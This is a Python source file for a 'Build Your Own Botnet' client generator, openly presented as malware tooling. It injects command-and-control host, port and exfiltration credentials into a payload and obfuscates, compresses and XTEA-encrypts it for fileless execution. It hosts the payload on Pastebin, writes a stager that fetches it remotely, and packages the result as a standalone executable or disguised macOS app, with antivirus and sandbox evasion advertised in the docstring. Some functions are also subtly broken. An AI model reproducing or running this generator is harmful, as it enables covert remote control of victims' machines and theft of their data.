#!/usr/bin/python
"""
Client Generator (Build Your Own Botnet)

 - Bypass Firewall
    connects to server via outgoing connections
    (i.e. reverse TCP payloads) which most firewall
    filters allow by default
 
 - Evade Antivirus
    blocks any spawning process
    with names of known antivirus products
 
 - Prevent Analysis
    main client payload encrypted with a random 256-bit key
    and is only 
 
 - Avoid Detection
    abort execution if if a virtual
    environment is detected
 
 - Zero Dependencies
    not even Python is required to run
    a client because a Python interpreter is compiled with it
    into a standalone executable into a standalone executable
   
 - Unlimited Modules
    import any packages or custom modules
    hosted the server as if they were installed locally
     
 - Platform Independent
    compatible with PyInstaller and package is authored 
    in Python, a platform agnostic language
"""
from __future__ import print_function

# standard library

import os
import sys
import json
import zlib
import struct
import base64
import random
import urllib
import urllib2
import marshal
import logging
import requests
import argparse
import tempfile
import subprocess

# modules

from modules import util

# globals

_debug  = True
_logger = logging.getLogger(__name__)
_logger.addHandler(logging.StreamHandler())

def main():
    # command line argument parser
    parser = argparse.ArgumentParser(prog='client.py', description="Client Generator (Build Your Own Botnet)", version='0.1.3')

    # optional arguments
    parser.add_argument('host', 
                        action='store', 
                        type=str, 
                        help='server IP to connect to', 
                        default='localhost')

    parser.add_argument('port', 
                        action='store', 
                        type=int, 
                        help='server port number', 
                        default=1337)

    parser.add_argument('--upload', 
                        action='store_true', 
                        help='upload & host payload on pastebin (requires --pastebin)', 
                        default=False)

    parser.add_argument('--antivirus',
                        action='store_true',
                        default=False,
                        help='evade signature-based antivirus by randomizing file hash')

    parser.add_argument('--encrypt', 
                        action='store_true', 
                        help='encrypt payload (decrypts & runs without touching disk)', 
                        default=False)

    parser.add_argument('--obfuscate', 
                        action='store_true', 
                        help='obfuscate names of classes, functions, variables, etc.', 
                        default=False)

    parser.add_argument('--compress', 
                        action='store_true', 
                        help='zip-compress into a self-executing python script', 
                        default=False)

    parser.add_argument('--compile', 
                        action='store_true', 
                        help='compile into a standalone bundled executable', 
                        default=False)

    parser.add_argument('--debug', 
                        action='store_true',
                        help='print debugging output to the console',
                        default=False)

    # credentials
    creds = parser.add_argument_group('credentials')
    creds.title = 'optional credentials'

    creds.add_argument('--ftp-host', 
                        action='store', 
                        metavar='HOST', 
                        help='FTP server host')

    creds.add_argument('--ftp-user', 
                        action='store', 
                        metavar='USER', 
                        help='FTP login username')

    creds.add_argument('--ftp-pass', 
                        action='store', 
                        metavar='PASS', 
                        help='FTP login password')

    # api keys
    api  = parser.add_argument_group('api')
    api.title = 'optional api keys'

    api.add_argument('--imgur', 
                        action='store', 
                        type=str, 
                        metavar='API', 
                        help='imgur api key')

    api.add_argument('--pastebin', 
                        action='store', 
                        type=str, 
                        metavar='API', 
                        help='pastebin api key')

    api.add_argument('--vultr', 
                        action='store', 
                        type=str, 
                        metavar='API', 
                        help='vultr api key')

    options = parser.parse_args()
    globals()['_debug'] = options.debug
    globals()['_logger'].setLevel(logging.DEBUG if options.debug else logging.ERROR)
    return run(options)

def upload(source, api_dev_key=None, api_user_key=None):
    """ 
    Upload file/data to Pastebin

    `Required`
    :param str source:         data or readable file-like object
    :param str api_dev_key:    Pastebin api_dev_key

    `Optional`
    :param str api_user_key:   Pastebin api_user_key
    
    """
    try:
        if api_dev_key:
            info = {'api_option': 'paste', 'api_paste_code': util.normalize(source), 'api_dev_key': api_dev_key}
            if api_user_key:
                info.update({'api_user_key' : api_user_key})
            info  = urllib.urlencode(info)
            req   = urllib2.Request('https://pastebin.com/api/api_post.php', data=info)
            paste = urllib2.urlopen(req).read()
            return '{}/raw/{}'.format(os.path.split(paste)[0], os.path.split(paste)[1]) if paste.startswith('http') else paste
        else:
            return "No Pastebin API key found"
    except Exception as e:
        globals()['_logger'].error('Method {} returned error: {}'.format(upload.func_name, str(e)))

def encrypt(plaintext, key, block_size=8, key_size=16, num_rounds=32, padding=chr(0)):
    """
    Encrypt data using classic XOR encryption

    `Required`
    :param str plaintext:       data to encrypt
    :param str key:             128-bit key

    `Optional`
    :param int block_size:      block size
    :param int key_size:        key size
    :param int num_rounds:      number of rounds
    """
    try:
        data    = bytes(plaintext) + (int(block_size) - len(bytes(plaintext)) % int(block_size)) * bytes(padding)
        blocks  = [data[i * block_size:((i + 1) * block_size)] for i in range(len(data) // block_size)]
        vector  = os.urandom(8)
        result  = [vector]
        for block in blocks:
            block   = bytes().join(chr(ord(x) ^ ord(y)) for x, y in zip(vector, block))
            v0, v1  = struct.unpack("!2L", block)
            k       = struct.unpack("!4L", key[:key_size])
            sum, delta, mask = 0L, 0x9e3779b9L, 0xffffffffL
            for round in range(num_rounds):
                v0  = (v0 + (((v1 << 4 ^ v1 >> 5) + v1) ^ (sum + k[sum & 3]))) & mask
                sum = (sum + delta) & mask
                v1  = (v1 + (((v0 << 4 ^ v0 >> 5) + v0) ^ (sum + k[sum >> 11 & 3]))) & mask
            output  = vector = struct.pack("!2L", v0, v1)
            result.append(output)
        return base64.b64encode(bytes().join(result))
    except Exception as e:
        globals()['_logger'].error('Method {} returned error: {}'.format(encrypt.func_name, str(e)))

def exe(options, filename):
    """
    Compile the Python stager file into a standalone executable
    with a built-in Python interpreter

    `Required`
    :param options:         argparse.Namespace object
    :param str filename:    target filename
    """
    try:
        filename = os.path.join(tempfile.gettempdir(), os.path.basename(filename))
        pyname   = os.path.basename(filename)
        name     = os.path.splitext(pyname)[0]
        dist     = os.path.abspath('.')
        key      = util.variable(16)
        icon     = options.icon if os.path.isfile(options.icon) else None
        pkgs     = list(set([i.strip().split()[1] for i in open(filename).read().splitlines() if len(i.strip().split()) if i.strip().split()[0] == 'import'] + [i.strip().split()[1] for i in open(filename,'r').read().splitlines() if len(i.strip().split()) if i.strip().split()[0] == 'import' if len(str(i.strip().split()[1])) < 35]))
        spec     = open('resources/pyinstaller.spec','r').read().replace('[HIDDEN_IMPORTS]', str(pkgs)).replace('[ICON_PATH]', icon).replace('[PY_FILE]', pyname).replace('[DIST_PATH]', dist).replace('[NAME]', name).replace('[128_BIT_KEY]', key)
        fspec    = os.path.join(dist, name + '.spec')
        with file(fspec, 'w') as fp:
            fp.write(fspec)
        try:
            pyinst = subprocess.check_output('where PyInstaller' if os.name == 'nt' else 'which PyInstaller', shell=True).strip().rstrip()
        except:
            raise Exception("missing package 'PyInstaller' is required to compile .py into .exe")
        make = subprocess.Popen('{} -m {} {}'.format(sys.executable, pyinst, fspec), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True)
        if globals()['_debug']:
            while True:
                if make.poll():
                    try:
                        util.display(make.stdout.readline())
                    except:
                        pass
                else:
                    break
        else:
            make.wait()
        if not make.returncode == 0:
            raise Exception("failed to compile executable: {}".format(str().join((make.communicate()))))
        exe   = os.path.join((dist, 'dist', name, '.exe' if os.name == 'nt' else ''))
        build = map(util.delete, (filename, fspec, os.path.join(dist, 'build')))
        return exe
    except Exception as e:
        globals()['_logger'].error('Method {} returned error: {}'.format(exe.func_name, str(e)))

def app(options, filename):
    """
    Bundle the Python stager file into a Mac OS X application

    `Required`
    :param options:         argparse.Namespace object
    :param str filename:    target filename
    """
    try:
        iconFile        = options.icon if os.path.isfile(options.icon) else None
        version         = '%d.%d.%d' % (random.randint(0,3), random.randint(0,6), random.randint(1, 9))
        baseName        = os.path.basename(filename)
        bundleName      = os.path.splitext(baseName)[0]
        pkgPath         = os.path.join(basePath, 'PkgInfo')
        appPath         = os.path.join(os.getcwd(), '%.app' % bundleName)
        basePath        = os.path.join(appPath, 'Contents')
        distPath 	    = os.path.join(basePath, 'MacOS')
        rsrcPath        = os.path.join(basePath, 'Resources')
        plistPath       = os.path.join(rsrcPath, 'Info.plist')
        iconPath        = os.path.basename(iconFile)
        executable      = os.path.join(distPath, filename)
        bundleVersion   = '%s %s'  % (bundleName, version)
        bundleIdentity  = 'com.%s' % bundleName
        infoPlist       = open('resources/app.plist').read() % (baseName, bundleVersion, iconPath, bundleIdentity, bundleName, bundleVersion, version)
        os.makedirs(distPath)
        os.mkdir(rsrcPath)
        with file(pkgPath, "w") as fp:
            fp.write("APPL????")
        with file(plistPath, "w") as fw:
            fw.write(infoPlist)
        os.rename(filename, os.path.join(distPath, baseName))
        return appPath
    except Exception as e:
        globals()['_logger'].error('Method {} returned error: {}'.format(app.func_name, str(e)))

def run(options, payload='modules/payload.py', stager='modules/stager.py'):
    """
    Generate a client

    `Required`
    :param options:         parsed arguments
    :param str payload:     payload filename 
    :param str stager:      stager filename
    """
    if not os.path.isdir('clients'):
        os.mkdir('clients')
    client = tempfile.NamedTemporaryFile(prefix='client_', suffix='.py', dir=os.path.abspath('clients'), delete=False)

    # Payload
    payload = open(payload, 'r').read().replace('__KWARGS__', ', '.join(["host='{}', port={}".format(options.host, options.port), "ftp={}".format(json.dumps({'host': options.ftp_host, 'user': options.ftp_user, 'pass': options.ftp_pass}) if bool(options.ftp_host and options.ftp_user and options.ftp_pass) else '', "pastebin='{}'".format(options.pastebin) if options.pastebin else '', "imgur='{}'".format(options.imgur) if options.imgur else '')]))

    if options.obfuscate:
        temp = tempfile.NamedTemporaryFile(prefix='byob_', suffix='.py', delete=False)
        temp.file.write(payload)
        temp.file.close()
        obfs = subprocess.Popen('pyminifier -o {} --obfuscate-classes --obfuscate-functions --obfuscate-variables --obfuscate-builtins --replacement-length=1 --pyz={}.pyz {}'.format(temp.name, os.path.splitext(os.path.basename(temp.name))[0], temp.name), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True)
        obfs.wait()
        assert obfs.returncode == 0, "payload obfuscation failed - {}".format(str().join((obfs.communicate())))
        code = open(temp.name, 'r').read()
        diff =  round(float(100.0 * float(1.0 - float(len(code))/float(len(payload)))))
        os.remove(temp.name)
        util.display("[+] ", color='green', style='bright', end='')
        util.display("Payload obfuscation complete", color='reset', style='bright')
        util.display("    ({:,} bytes {} to {:,} bytes  ({}% {})".format(len(payload), 'increased' if len(code) > len(payload) else 'reduced', len(code), diff, 'larger' if len(code) > len(payload) else 'smaller').ljust(80 - len("[+] ")), color='reset', style='dim')
        payload = code

    if options.compress:
        code = "import zlib,base64,marshal;exec marshal.loads(zlib.decompress(base64.b64decode({})))".format(repr(base64.b64encode(zlib.compress(marshal.dumps(compile(payload, '', 'exec')), 9))))
        diff =  round(float(100.0 * float(1.0 - float(len(code))/float(len(payload)))))
        util.display("[+] ", color='green', style='bright', end='')
        util.display("Payload compression complete", color='reset', style='bright')
        util.display("    ({:,} bytes {} to {:,} bytes  ({}% {})".format(len(payload), 'increased' if len(code) > len(payload) else 'reduced', len(code), diff, 'larger' if len(code) > len(payload) else 'smaller').ljust(80 - len("[+] ")), color='reset', style='dim')
        payload = code

    if options.encrypt:
        key  = base64.b64encode(os.urandom(16))
        code = encrypt(payload, base64.b64decode(key), block_size=8, key_size=16, num_rounds=32, padding=chr(0))
        diff = round(float(100.0 * float(float(len(code))/float(len(payload)) - 1.0)))
        util.display("[+] ", color='green', style='bright', end='')
        util.display("Payload encryption complete", color='reset', style='bright')
        util.display("    ({:,} bytes {} to {:,} bytes ({}% {})".format(len(payload), 'increased' if len(code) > len(payload) else 'reduced', len(code), diff, 'larger' if len(code) > len(payload) else 'smaller').ljust(80 - len("[+] ")), style='dim', color='reset')
        payload = code

    if options.upload:
        if options.pastebin:
            url = upload(payload, api_dev_key=options.pastebin)
            util.display("[+] ", color='green', style='bright', end='')
            util.display("Payload upload complete", style='bright', color='reset')
            util.display("    (hosting payload online at: {})".format(url).ljust(80 - len("[+] ")), color='reset', style='dim')
        else:
            url  = 'http://{}:{}/clients/{}'.format(options.host, options.port, client.name)
            util.display("[-] ", color='red', style='bright', end='')
            util.display("Error: ", color='reset', style='bright', end='')
            util.display("upload requires --pastebin", color='reset', style='dim')
            return
    else:
        url  = 'http://{}:{}/clients/{}'.format(options.host, options.port, client.name)
        temp = tempfile.NamedTemporaryFile(prefix='payload', suffix='.py', dir='clients', delete=False)
        temp.file.write(payload)
        temp.file.close()
        util.display("[+] ", color='green', style='bright', end='')
        util.display("Payload generation complete", style='bright', color='reset')
        util.display("    (hosting payload locally at {})".format(os.path.abspath(temp.name)))

    # Stager
    stager   = '\n'.join([open(stager, 'r').read(), "if __name__=='__main__':", "    run({})".format(', '.join(["url='{}'".format(url) if 'url' in locals() else '', "key='{}'".format(key) if 'key' in locals() else '']))])

    if options.obfuscate:
        temp = tempfile.NamedTemporaryFile(prefix='byob_', suffix='.py', delete=False)
        temp.file.write(stager)
        temp.file.close()
        obfs = subprocess.Popen('pyminifier -o {} --obfuscate-classes --obfuscate-functions --obfuscate-variables --obfuscate-builtins --replacement-length=1 --pyz={}.pyz {}'.format(temp.name, os.path.splitext(os.path.basename(temp.name))[0], temp.name), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True)
        obfs.wait()
        assert obfs.returncode == 0, "stager obfuscation failed - {}".format(str().join((obfs.communicate())))
        code = open(temp.name, 'r').read()
        diff =  round(float(100.0 * float(1.0 - float(len(code))/float(len(stager)))))
        util.display("[+] ", color='green', style='bright', end='')
        util.display("Stager obfuscation complete", color='reset', style='bright')
        util.display("    ({:,} bytes {} to {:,} bytes  ({}% {})".format(len(stager), 'increased' if len(code) > len(stager) else 'reduced', len(code), diff, 'larger' if len(code) > len(stager) else 'smaller').ljust(80 - len("[+] ")), color='reset', style='dim')
        stager = code

    if options.compress:
        code = "import zlib,base64,marshal;exec marshal.loads(zlib.decompress(base64.b64decode({})))".format(repr(base64.b64encode(zlib.compress(marshal.dumps(compile(stager, '', 'exec')), 9))))
        diff = round(float(100.0 * float(float(len(code))/float(len(payload)) - 1.0)))
        util.display("[+] ", color='green', style='bright', end='')
        util.display("Stager compression complete", color='reset', style='bright')
        util.display("    ({:,} bytes {} to {:,} bytes  ({}% {})".format(len(stager), 'increased' if len(code) > len(stager) else 'reduced', len(code), diff, 'larger' if len(code) > len(stager) else 'smaller').ljust(80 - len("[+] ")), color='reset', style='dim')
        stager = code

    # Client

    client.file.write(stager)
    client.file.close()
    util.display("[+] ", color='green', style='bright', end='')
    util.display("Client generation complete", color='reset', style='bright')
    util.display( "    (saved to file: {})".format(client.name).ljust(80 - len("[+] ")), style='dim', color='reset')
    if options.compile:
        if sys.platform == 'darwin':
            return app(options, client.name)
        return exe(options, client.name)
    return client.name

if __name__ == '__main__':
    main()
